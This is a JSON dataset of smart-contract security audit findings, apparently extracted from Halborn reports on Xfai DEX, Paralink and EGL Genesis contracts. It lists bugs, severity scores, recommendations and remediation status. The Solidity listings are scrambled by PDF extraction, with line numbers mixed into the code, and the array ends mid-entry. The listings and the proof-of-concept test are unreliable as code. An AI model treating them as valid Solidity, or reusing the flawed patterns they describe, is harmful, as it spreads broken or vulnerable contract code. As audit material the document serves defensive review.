[
    {
        "title": "ADDLIQUIDITYETH MISHANDLES DEPOSIT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The function addLiquidityETH from the XfaiV0Periphery01.sol contract takes ETH received from the user and deposits it into the WETH/XFETH pool. If the pool has liquidity, it computes the amount to deposit of each asset. First, it calculates the proportional amount of ETH sent for the sum of the amounts of each token that the pool has. Then it subtracts the obtained value to the amount of sent ETH to transform it to xfETH. As xfETH tends to increase its value, this calculation can result in a non-optimal deposit, making users obtain less LP tokens than the optimal distribution may achieve. Code Location: Listing 1: xfETH.sol 153 function addLiquidityETH ( 154 address _to , 155 uint _deadline 156 ) external payable override ensure ( _deadline ) returns ( uint  liquidity ) { 157 158 159 160 161 162 163 164 165 address _weth = weth ; // gas saving uint amountETH ; uint amountXfETHtoETH ; address pool = IXfaiFactory ( factory ). getPool ( _weth ); if ( pool == address (0) ) { // create the pool if it doesn 't exist yet pool = IXfaiFactory ( factory ). createPool ( _weth ); } ( uint ETHReserve , uint xfETHReserve ) = IXfaiPool ( pool ).  getStates () ; if ( ETHReserve == 0 && xfETHReserve == 0) { ( amountETH , amountXfETHtoETH ) = ( msg . value / 2 , msg . value / 166 167  2) ; 168 } else { 21 169 amountETH = ( msg . value * ETHReserve ) / ( ETHReserve +  xfETHReserve ); 170 171 172 amountXfETHtoETH = msg . value - amountETH ; } uint amountXfETH = IXFETH ( xfETH ). deposit { value :  amountXfETHtoETH }() ; 173 174 175 176 177 IWETH ( _weth ). deposit { value : amountETH }() ; TransferHelper . safeTransfer ( xfETH , pool , amountXfETH ); TransferHelper . safeTransfer ( _weth , pool , amountETH ); liquidity = IXfaiV0Core ( core ). mint ( _weth , _to ); require ( msg . value == amountETH + amountXfETHtoETH , '  XfaiV0Periphery01 : INSUFFICIENT_AMOUNT '); 178 } Proof Of Concept: The issue resides in the fact that the calculation for the corresponding amount of xfETH is the amount of ETH that will be converted to xfETH. Thus, if the value of xfETH is higher than ether, this amount will decrease when converted to the token system. As the formula for minting LP tokens takes the minimum of the resulting product of the added tokens, the LP tokens minted may be lower than other distributions. The next scenario is used to illustrate the described issue. 1. ETH to Xfeth price has a relation of 3 Eth to 2 xfETH. 2. ETH balance of xfETH contract is 1.5 bigger than the total supply. 3. The WETH/XFETH pool is balanced, with 300 WETH on reserve and 200 xfETH on weight. 4. User deposits 10 ether. 5. The test also computes the LP minted with a different distribution based on the values previous to the original deposit. Listing 2: ITest4.sol 1 pragma solidity ^0.8.19; 2 3 import ' test / Deployer . sol '; 4 22 deal ( address ( this ) , 1000 ether ); // xfaiperiphery . addLiquidityETH { value : 20 ether }( address ( } super . setUp () ; MockWETH weth2 ; function setUp () public override { function test_integration_addLiquidityEth () public { xfactory . createPool ( address ( weth )) ; address pool = xfactory . getPool ( address ( weth )) ; xfeth . deposit { value : 20 ether }() ; weth . deposit { value : 30 ether }() ; xfeth . transfer ( pool , 20 ether ); weth . transfer ( pool , 30 ether ); xfaicore . mint ( address ( weth ) , address ( this )); 5 contract ITest is Deployer { 6 7 8 9 10 11 12 13  this ) , block . timestamp +1000) ; 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  )); 29  getStates () ; 30 31 32 33  10 ether }( address ( this ) , block . timestamp +1000) ; 34 35 36 37  ); 38 39  / ETHReserve , ( amountXfETHNew * totalSupply ) / xfETHReserve ); 40 41 42 console . log ( ' LPOriginal ', originalLP ); console . log ( ' LPImproved ', liquidityNew ); uint256 newBalance = ( address ( xfeth ). balance * 3) / 2; deal ( address ( xfeth ) , newBalance ); uint256 totalSupply = MockERC20 ( pool ). totalSupply () ; ( uint ETHReserve , uint xfETHReserve ) = IXfaiPool ( pool ). uint amountETHNew = 5 ether ; uint amountXfETHtoETHNew = 10 ether - amountETHNew ; uint amountXfETHNew = xfeth . ETHToXfETH ( amountXfETHtoETHNew uint liquidityNew = Math . min (( amountETHNew * totalSupply ) uint256 originalLP = xfaiperiphery . addLiquidityETH { value : address pool = IXfaiFactory ( xfactory ). getPool ( address ( weth 23 } 43 44 } The next screenshots show the difference between the LP tokens obtained. As it is possible to observe, the difference does exist. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:M/Y:L/R:N/S:U (5.6) Recommendation: Consider using a new formula that obtains the optimal distribution. As this may not be an easy task, it can also be a reasonable approach to establish a user defined minimal distribution to perform the calculations. It is also advised to set a minimal LP tokens to be obtained to avoid front-running issues. Remediation Plan: SOLVED: 3ceca61a67a245e4bb7d7774cfbb34e3eec1aeaa. Xfai team solved the The issue on the next commit ID 24 ",
        "labels": [
            "Halborn",
            "Xfai_DEX",
            "Severity: Medium"
        ]
    },
    {
        "title": "IMPROVEMENTS FOR FLASH CALLS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Xfai Protocol has two different functions to perform flash calls. First one through a flash mint on the Xfeth.sol contract. The second one is a classic flash loan on the XfaiV0Core.sol contract. Although the functions are technically correct from a basic functionality point of view, the standard established on EIP-3165 is not fulfilled. The standard improvements are:  Implement a flashFee view function to compute the fee for a given token amount.  Implement a maxFlashLoan view function to obtain the maximum number of tokens available.  Return true if the execution is successful.  Control the return value of the callback function.  Send the parameters of msg.sender, token, amount, fee and data as inputs to the receiver callback function. Code Location: Listing 3: XFETH.sol (Line 186) 174 function flashMint ( uint _amount ) external override nonReentrant  isPublic { 175 176 177 178 179 180 181 182 183 // get current ETH balance uint ETHBalance = address ( this ). balance ; uint xfETHTotalSupply = totalSupply () ; // compute fee uint fee = ( _amount * flashMintFee ) / 10000; // mint tokens _mint ( msg . sender , _amount ); 25 184 185 186 187 188 189 // hand control to borrower IBorrower ( msg . sender ). executeOnFlashMint ( _amount ); // burn tokens + fee _burn ( msg . sender , _amount + fee ); // reverts if ` msg . sender `  does not have enough tokens to burn 190 191 // double - check that the contract 's ETH balance has not  decreased 192 193 194 195 196 197 198 } assert ( address ( this ). balance >= ETHBalance ); // double - check that the contract 's xfETH supply has decreased assert ( totalSupply () < xfETHTotalSupply ); emit FlashMint ( msg . sender , _amount ); Listing 4: XfaiV0Core.sol (Line 335) 323 function flashLoan ( 324 address _token , 325 uint _amount , 326 address _to , 327 bytes calldata _data 328 ) external override pausable singleLock ( _token ) { 329 330 require ( _to != address (0) , ' XfaiV0Core INVALID_TO '); address pool = XfaiLibrary . poolFor ( _token , factory ,  poolCodeHash ); 331 332 ( uint reserve , ) = IXfaiPool ( pool ). getStates () ; require ( _amount <= reserve , ' XfaiV0Core :  INSUFFICIENT_OUTPUT_AMOUNT '); 333 334 uint balance = IERC20 ( _token ). balanceOf ( pool ); IXfaiPool ( pool ). linkedTransfer ( _token , _to , _amount ); //  optimistically transfer tokens 335 336 337 IXfaiV0FlashLoan ( _to ). flashLoan ( pool , _amount , _data ); require ( IERC20 ( _token ). balanceOf ( pool ) >= balance + (( _amount *  getTotalFee () ) / 10000) , 338 339 340 ' XfaiV0Core : INSUFFICIENT_AMOUNT_RETURNED ' ); IXfaiPool ( pool ). linkedTransfer ( _token , infinityNFT , ( _amount *  infinityNFTFee ) / 10000) ; // send lnft fee to fee collecting  contract 26 341 IXfaiPool ( pool ). update ( IERC20 ( _token ). balanceOf ( pool ) , IERC20 (  xfETH ). balanceOf ( pool )) ; emit FlashLoan ( _to , _amount ); 342 343 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: From all the previous detailed improvements, consider implementing all of them. Nonetheless, there is one that the Halborn team strongly suggests. These are the parameters specified for the receive callback function. By adding the msg.sender it is ensured that the receiver fallback function executes from trusted origins. Adding the fee avoids the receiver contract to perform any computation or further contract calls to obtain this value. Sending the token address simplifies the logic of the receiver. Finally, the data is absolutely needed to execute the adequate control flow statements on the receiver side. Moreover, consider implementing interfaces following the standard to simplify the usability of the protocol. Reference EIP-3156 Remediation Plan: ACKNOWLEDGED: The Xfai team acknowledged this finding. 27 ",
        "labels": [
            "Halborn",
            "Xfai_DEX",
            "Severity: Informational"
        ]
    },
    {
        "title": "ENFORCE XFETH CONSTRUCTOR TO RECEIVE ETH",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The xfEth.solcontract must receive ether on the constructor. The formula used for minting liquidity on the deposit function uses the total supply of xfeth on the numerator of a division to calculate the number of tokens to give in return. If this value is zero, the returned amount will always be zero. Code Location: Listing 5: XFETH.sol 77 constructor ( address _owner , uint _flashMintFee ) payable ERC20 () { 78 79 80 81 82 83 84 } _mint ( address (0) , msg . value ); owner = _owner ; flashMintFee = _flashMintFee ; _status = _NOT_ENTERED ; _name = ' Xfai ETH '; _symbol = ' XFETH '; Listing 6: XFETH.sol 153 function deposit () public payable override nonReentrant returns (  uint amountInXfETH ) { 154 amountInXfETH = ( msg . value * totalSupply () ) / ( address ( this ).  balance - msg . value ); 155 156 157 } _mint ( msg . sender , amountInXfETH ); emit Deposit ( msg . sender , amountInXfETH , msg . value ); 28 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Consider adding a require statement to enforce the contract to receive ether when deployed. Remediation Plan: ACKNOWLEDGED: The Xfai team acknowledged this finding. 29 ",
        "labels": [
            "Halborn",
            "Xfai_DEX",
            "Severity: Informational"
        ]
    },
    {
        "title": "NO SLIPPAGE CONTROL WHEN MINTING XFETH",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The deposit function of xfETH.sol contract allows sending ether and receive xfeth token in return. The nature of this contract allows xfeth value to increase, by reducing the total supply through the fee burned on the flashMint function and remaining the same native token balance. The Xfai DEX is designed to work in optimal conditions, with flashMints being constantly used to take advantage of arbitrage opportunities. It also means, any time an arbitrageur succeeds, all the pools will get unbalanced, starting a virtuous loop of constant profit for all actors in the system. Due to this, it is plausible that a user who attempts to deposit ETH and get Xfeth in return does not obtain the desired amount. Moreover, in certain value ranges, it is possible to send ETH and obtain zero Xfeth in return. So, considering these two scenarios, it is sensible to consider implementing a slippage control of the minimal amount of Xfeth expected on the deposit function. Code Location: Listing 7: xfETH.sol 153 function deposit () public payable override nonReentrant returns (  uint amountInXfETH ) { 154 amountInXfETH = ( msg . value * totalSupply () ) / ( address ( this ).  balance - msg . value ); 155 156 157 } _mint ( msg . sender , amountInXfETH ); emit Deposit ( msg . sender , amountInXfETH , msg . value ); 30 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Consider adding a parameter variable for the deposit function that allows the user to revert the transaction if the Xfeth returned value is lower than expected. Remediation Plan: ACKNOWLEDGED: The Xfai team acknowledged this finding. 31 ",
        "labels": [
            "Halborn",
            "Xfai_DEX",
            "Severity: Informational"
        ]
    },
    {
        "title": "ADDLIQUIDITYETH FUNCTION MAY REVERT ON FIRST DEPOSIT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The addLiquidityETH function from the XfaiV0Periphery01.sol contract, on the first deposit to the Weth/Xfeth pool, splits the value of ETH sent by the user to use each amount to obtain weth and xfeth. With those obtained amounts at the end of the function, it performs a require statement, where those values are added and need to be equal to the msg.value. The problem of this implementation arises when the first deposit is done with and odd ETH number. In this case, the require statement will revert due to solidity precision loss. Code Location: Listing 8: XfaiV0Periphery01.sol (Lines 177,187) 163 function addLiquidityETH ( 164 address _to , 165 uint _deadline 166 ) external payable override ensure ( _deadline ) returns ( uint  liquidity ) { 167 168 169 170 171 172 173 174 175 address _weth = weth ; // gas saving uint amountETH ; uint amountXfETHtoETH ; address pool = IXfaiFactory ( factory ). getPool ( _weth ); if ( pool == address (0) ) { // create the pool if it doesn 't exist yet pool = IXfaiFactory ( factory ). createPool ( _weth ); } ( uint ETHReserve , uint xfETHReserve ) = IXfaiPool ( pool ).  getStates () ; if ( ETHReserve == 0 && xfETHReserve == 0) { ( amountETH , amountXfETHtoETH ) = ( msg . value / 2 , msg . value / 176 177  2) ; 32 178 179 } else { amountETH = ( msg . value * ETHReserve ) / ( ETHReserve +  xfETHReserve ); 180 181 182 amountXfETHtoETH = msg . value - amountETH ; } uint amountXfETH = IXFETH ( xfETH ). deposit { value :  amountXfETHtoETH }() ; 183 184 185 186 187 IWETH ( _weth ). deposit { value : amountETH }() ; TransferHelper . safeTransfer ( xfETH , pool , amountXfETH ); TransferHelper . safeTransfer ( _weth , pool , amountETH ); liquidity = IXfaiV0Core ( core ). mint ( _weth , _to ); require ( msg . value == amountETH + amountXfETHtoETH , '  XfaiV0Periphery01 : INSUFFICIENT_AMOUNT '); 188 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: The case of doing a first deposit with an odd number is an edge case. Nevertheless, it is possible to implement a solution for avoiding the possibility to revert on a fair deposit. Remediation Plan: ACKNOWLEDGED: The Xfai team acknowledged this finding. 33 ",
        "labels": [
            "Halborn",
            "Xfai_DEX",
            "Severity: Informational"
        ]
    },
    {
        "title": "ABSENCE OF TOKEN OWNERSHIP CHECK IN THE BOOST FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The function boost of the XfaiINFT.sol contract allows increasing the number of shares of a specific NFT token ID, based on the amount of XFIT tokens that the factory has received. However, the function does not check if the caller owns the indicated token ID. This does not represent a security risk, but it can prevent certain unwanted scenarios from the user perspective. Code Location: Listing 9: XfaiINFT.sol (Line 217) 211 function boost ( uint _tokenID ) external override lock returns ( uint  share ) { 212 213 require ( _tokenID <= counter , ' XfaiINFT : Inexistent_ID '); uint amount = IERC20 ( underlyingToken ). balanceOf ( factory ) -  reserve ; require ( amount != 0 , ' XfaiINFT : INSUFICIENT_AMOUNT '); reserve += amount ; share = (1 e18 * amount ) / ( reserve + initialReserve ); INFTShares [ _tokenID ] += share ; totalSharesIssued += share ; emit Boost ( msg . sender , share , _tokenID ); 214 215 216 217 218 219 220 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) 34 Recommendation: Consider adding a require statement that prevents any user except the owner to increase the shares of the specified NFT. Remediation Plan: ACKNOWLEDGED: The Xfai team acknowledged this finding. 35 ",
        "labels": [
            "Halborn",
            "Xfai_DEX",
            "Severity: Informational"
        ]
    },
    {
        "title": "THE PROTOCOL DOES NOT ALLOW TO ADD LIQUIDITY USING XFETH",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The current implementation of Xfai Protocol does not allow to users to The current functions of the protocol provide liquidity using Xfeth. force the user to supply ETH that is transformed into Xfeth. This can be an issue for the users, specially to the ones that already have xfeth minted, in the case of an appreciation of the xfeth token to ETH. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Consider adding on the XfaiV0Periphery01.sol contract the necessary func- tions to allow adding liquidity with the main token of the protocol. Remediation Plan: PENDING: The Xfai team plans to implement this functionality in the next release. 36 ",
        "labels": [
            "Halborn",
            "Xfai_DEX",
            "Severity: Informational"
        ]
    },
    {
        "title": "REMOVING LIQUIDITY CAN REVERT IF TOKEN ORDER IS NOT SET",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The internal _removeLiquidity function of the XfaiV0Periphery01.sol con- These inputs come tract, receives two token addresses as parameters. from the external function removeLiquidity. If none of the inputs tokens address is the WETH contract, the internal function is called, passing directly the input user parameters received. The function then attempts to retrieve the address of the pool corresponding to the token in the first place, however, if the address corresponds to the Xfeth token, the transaction reverts, attempting to call a function of the zero address. Code Location: Listing 10: XfaiV0Periphery01.sol (Lines 200,201) 191 function _removeLiquidity ( 192 address _token0 , 193 address _token1 , 194 uint _liquidity , 195 uint _amount0Min , 196 uint _amount1Min , 197 address _to 198 ) private returns ( uint amount0 , uint amount1 ) { address _core = core ; // gas saving 199 address pool = XfaiLibrary . poolFor ( _token0 , factory , 200  poolCodeHash ); 201 TransferHelper . safeTransferFrom ( pool , msg . sender , _core ,  _liquidity ); 202 ( amount0 , amount1 ) = IXfaiV0Core ( _core ). burn ( _token0 , _token1 ,  _to ); 203 require ( amount0 >= _amount0Min , ' XfaiV0Periphery01 :  INSUFFICIENT_AMOUNT0 '); 204 require ( amount1 >= _amount1Min , ' XfaiV0Periphery01 :  INSUFFICIENT_AMOUNT1 '); 205 } 37 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Consider controlling the tokens address to avoid unnecessary reverts. Remediation Plan: ACKNOWLEDGED: The Xfai team acknowledged this finding. 38 ",
        "labels": [
            "Halborn",
            "Xfai_DEX",
            "Severity: Informational"
        ]
    },
    {
        "title": "REDUNDANT VARIABLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Xfai_DEX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Line 363 of the XfaiV0Periphery01.sol contract is not required, as the stored value of the variable is not used. Code Location: Listing 11: XfaiV0Periphery01.sol (Line 363) 346 function swapTokensForExactTokens ( 347 address _to , 348 address _token0 , 349 address _token1 , 350 uint _amount1Out , 351 uint _amount0InMax , 352 uint _deadline 353 ) external override ensure ( _deadline ) returns ( uint amount0In ) { 354 355 356 357 358 359 360 pool0 = XfaiLibrary . poolFor ( _token1 , factory , poolCodeHash ); pool1 = XfaiLibrary . poolFor ( _token1 , factory , poolCodeHash ); ( uint r , uint w) = IXfaiPool ( pool0 ). getStates () ; amount0In = XfaiLibrary . getAmountIn (w , r , _amount1Out , address pool0 ; address pool1 ; if ( _token0 == xfETH ) {  IXfaiV0Core ( core ). getTotalFee () ); 361 362 363 364 365 } else if ( _token1 == xfETH ) { pool0 = XfaiLibrary . poolFor ( _token0 , factory , poolCodeHash ); pool1 = XfaiLibrary . poolFor ( _token0 , factory , poolCodeHash ); ( uint r , uint w) = IXfaiPool ( pool0 ). getStates () ; amount0In = XfaiLibrary . getAmountIn (r , w , _amount1Out ,  IXfaiV0Core ( core ). getTotalFee () ); 366 367 368 369 370 371 372 } else { pool0 = XfaiLibrary . poolFor ( _token0 , factory , poolCodeHash ); pool1 = XfaiLibrary . poolFor ( _token1 , factory , poolCodeHash ); amount0In = XfaiLibrary . getAmountsIn ( pool0 , pool1 , _amount1Out , 39 373 374 375 376 IXfaiV0Core ( core ). getTotalFee () ); } require ( amount0In <= _amount0InMax , ' XfaiV0Periphery01 :  INSUFFICIENT_INPUT_AMOUNT '); 377 TransferHelper . safeTransferFrom ( _token0 , msg . sender , pool0 ,  amount0In ); _swap ( _token0 , _token1 , _to ); 378 379 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Consider erasing the unnecessary lines from the code base. Remediation Plan: SOLVED: The Xfai team removed the redundant variable on the next commit ID 3ceca61a67a245e4bb7d7774cfbb34e3eec1aeaa. 40 4.10 (HAL-10) LACK OF UPGRADABILITY PATTERN - INFORMATIONAL (0.0) ",
        "labels": [
            "Halborn",
            "Xfai_DEX",
            "Severity: Informational"
        ]
    },
    {
        "title": "3.1 USE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Paralink_Token_SmartContract_Halborn_Report_v1.pdf",
        "body": "Block timestamps have historically been used for a variety of applica- tions, such as entropy for random numbers, locking funds for periods of time and various state-changing conditional statements that are time- dependent. Miners have the ability to adjust timestamps slightly which can prove to be quite dangerous if block timestamps are used incorrectly in smart contracts. block.timestamp or its alias now can be manipulated by miners if they have some incentive to do so Code Location: ParaToken.sol Line #121 Recommendation: Avoid relying on block.timestamp 8 ",
        "labels": [
            "Halborn",
            "Paralink_Token_SmartContract_Halborn",
            "Severity: Informational"
        ]
    },
    {
        "title": "MythX: 9 THANK YOU FOR CHOOSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Paralink_Token_SmartContract_Halborn_Report_v1.pdf",
        "body": "Slither and MythX has been run on all the scoped contracts(ParaToken.sol) MythX: 9 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Paralink_Token_SmartContract_Halborn",
            "Severity: Informational"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "EglGenesis.sol contract use the floating pragma ^0.6.0. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma, for example, either an outdated pragma version that might introduce bugs that affect the contract system negatively or a recently released pragma version which has not been extensively tested. Reference: ConsenSys Diligence - Lock pragmas Code Location: EglGenesis.sol Line #1 Listing 1: EglGenesis.sol (Lines 1) 1 pragma solidity ^0.6.0;  This is an example where the floating pragma is used. ^0.6.0. Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider lock the pragma version known bugs for the compiler version. Therefore, it is recommended not to use floating pragma in the production. Apart from just locking the pragma version in the code, the sign (>= ) need to be removed. it is possible locked the pragma fixing the version both in truffle-config.js if you use the Truffle framework and 14 in hardhat.config.js if you use HardHat framework for the deployment. truffle-config.js hardhat.config.js Remediation Plan: SOLVED: EGL Team locked pragma version to 0.6.6. Listing 2: EglGenesis.sol (Lines 1) 1 pragma solidity 0.6.6; 2 3 import \" @openzeppelin / contracts - upgradeable / access / OwnableUpgradeable . sol \" ; 4 import \" @openzeppelin / contracts - upgradeable / proxy / Initializable . sol \" ; 5 import \" @openzeppelin / contracts - upgradeable / utils / PausableUpgradeable . sol \" ; 6 import \" @openzeppelin / contracts - upgradeable / math / SafeMathUpgradeable . sol \" ; 15 ",
        "labels": [
            "Halborn",
            "EGL_Genesis",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ADDRESS VALIDATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "In the EglGenesis.sol contract is missing a safety check inside their constructors and multiple functions. Setters of address type parameters should include a zero-address check otherwise contract functionality may become inaccessible or tokens burnt forever. Code Location: EglGenesis.sol Line #~103-112 Listing 3: EglGenesis.sol (Lines 103) 103 104 105 106 107 108 109 110 111 112 function initialize ( address _owner , uint _threshold ) public initializer { __Context_init_unchained () ; __Ownable_init_unchained () ; __Pausable_init_unchained () ; transferOwnership ( _owner ); canContribute = true ; maxThreshold = _threshold ; emit Initialized ( owner () , canContribute , _threshold ); } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add proper address validation when assigning a value to a variable from user-supplied data. Better yet, address white-listing/black-listing 16 should be implemented in relevant functions if possible. For example: Listing 4: Modifier.sol (Lines 2,3,4) 1 2 3 4 5 modifier validAddress ( address addr ) { require ( addr != address (0) , \" Address cannot be 0 x0 \"); require ( addr != address ( this ) , \" Address cannot be contract \" ); _; } Remediation Plan: SOLVED: EGL Team added address validation on the initialize function. initialize function defined instead of a constructor in the contract. Listing 5: EglGenesis.sol (Lines 2,3) 1 2 3 4 5 6 7 8 9 10 11 12 13 function initialize ( address _owner , uint _threshold ) external initializer { require ( _owner != address (0) , \" GENESIS : INVALID_OWNER \"); require ( _owner != address ( this ) , \" GENESIS : ADDRESS_IS_CONTRACT \"); __Context_init_unchained () ; __Ownable_init_unchained () ; __Pausable_init_unchained () ; transferOwnership ( _owner ); canContribute = true ; maxThreshold = _threshold ; emit Initialized ( owner () , canContribute , _threshold ); } 17 ",
        "labels": [
            "Halborn",
            "EGL_Genesis",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING CALCULATION ON THE CONTRIBUTORS COUNT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "During the phase of EglGenesis.sol contract, the user can withdraw con- tribution. The contract is applied multiple calculations and controls on the related functions. But, contributorsCount is not decreased when the user withdraw funds. Code Location: EglGenesis.sol Line #~117 Listing 6: EglGenesis.sol (Lines ) 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 function withdraw () public whenNotPaused { require ( canWithdraw , \" GENESIS : WITHDRAW_NOT_ALLOWED \" ); require ( contributors [ msg . sender ]. amount > 0, \" GENESIS : NOT_CONTRIBUTED \" ); uint amountToWithdraw = contributors [ msg . sender ]. amount ; uint contributorIdx = contributors [ msg . sender ]. idx ; delete contributors [ msg . sender ]; delete contributorsList [ contributorIdx - 1]; cumulativeBalance = cumulativeBalance . sub ( amountToWithdraw ); ( bool success , ) = msg . sender . call { value : amountToWithdraw }( \" \"); require ( success , \" GENESIS : WITHDRAW_FAILED \"); emit ContributionWithdrawn ( msg . sender , amountToWithdraw , now ); } 18 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add proper calculation on the contributorsCount variable. According to workflow, EGL can continue without substraction operation. Listing 7: Example Remediation (Lines 9) function withdraw () public whenNotPaused { require ( canWithdraw , \" GENESIS : WITHDRAW_NOT_ALLOWED \" ); require ( contributors [ msg . sender ]. amount > 0, \" GENESIS : NOT_CONTRIBUTED \" ); uint amountToWithdraw = contributors [ msg . sender ]. amount ; uint contributorIdx = contributors [ msg . sender ]. idx ; delete contributors [ msg . sender ]; delete contributorsList [ contributorIdx - 1]; contributorsCount = contributorsCount . sub (1) ; cumulativeBalance = cumulativeBalance . sub ( amountToWithdraw ); ( bool success , ) = msg . sender . call { value : amountToWithdraw }( \" \"); require ( success , \" GENESIS : WITHDRAW_FAILED \"); emit ContributionWithdrawn ( msg . sender , amountToWithdraw , now ); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Remediation Plan: SOLVED: The main purpose of the the contributorsCount variable is in combination with the contributorsList array. According to workflow, the variable name is changed with absoluteMaxContributorsCount. 19 ",
        "labels": [
            "Halborn",
            "EGL_Genesis",
            "Severity: Low"
        ]
    },
    {
        "title": "ALLOW WITHDRAW PROGRESS WITHOUT FUNDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "During the phase of EglGenesis.sol contract, only the owner can allow withdraw progress. But, without funds the owner can allow withdraw phase. Code Location: EglGenesis.sol Line #~117 Listing 8: EglGenesis.sol (Lines ) 135 136 137 138 139 140 141 function allowWithdraw () public onlyOwner whenNotPaused { require ( cumulativeBalance < maxThreshold , \" GENESIS : MAX_THRESHOLD_REACHED \" ); require ( canContribute , \" GENESIS : GENESIS_ENDED \" ); canWithdraw = true ; canContribute = false ; emit WithdAllowed ( msg . sender , now ); } Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommend to validate allowWithdraw function should not be called without funds. Listing 9: EglGenesis.sol (Lines 2) 2 3 function allowWithdraw () public onlyOwner whenNotPaused { require ( cumulativeBalance > 0, \" GENESIS : NO BALANCE \" ); 20 4 5 6 7 8 9 } require ( cumulativeBalance < maxThreshold , \" GENESIS : MAX_THRESHOLD_REACHED \" ); require ( canContribute , \" GENESIS : GENESIS_ENDED \" ); canWithdraw = true ; canContribute = false ; emit WithdAllowed ( msg . sender , now ); Remediation Plan: SOLVED: The cumulative balance check has been added into the allowWithdraw function. Listing 10: Fix (Lines ) 1 require ( cumulativeBalance > 0, \" GENESIS : NO_BALANCE \" ); 21 ",
        "labels": [
            "Halborn",
            "EGL_Genesis",
            "Severity: Low"
        ]
    },
    {
        "title": "OWNER CAN RENOUNCE OWNERSHIP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "The Owner of the contract is usually the account which deploys the contract. As a result, the Owner is able to perform some privileged actions. In the EglGenesis.sol smart contracts, the renounceOwnership function is used to renounce being Owner. Otherwise, if the ownership was not transferred before, the contract will never have an Owner, which is dangerous. Function: Risk Level: Likelihood - 1 Impact - 1 22 Recommendation: Its recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. As an other solution, Renounce Ownership functionality can be disabled with the following line. For example: Listing 11: Modifier.sol (Lines 3) 2 3 4 function renounceOwnership () public override onlyOwner { revert ( \" can 't renounceOwnership here \" ); // not possible with this smart contract } Remediation Plan: SOLVED: The contract will not allow owner to renounce ownership. Only transferOwnership function permitted. Listing 12: Fix (Lines ) 1 2 3 function renounceOwnership () public override onlyOwner { revert ( \" GENESIS : NO_RENOUNCE_OWNERSHIP \" ); } 23 ",
        "labels": [
            "Halborn",
            "EGL_Genesis",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING VALIDATION ON THE FUNCTION",
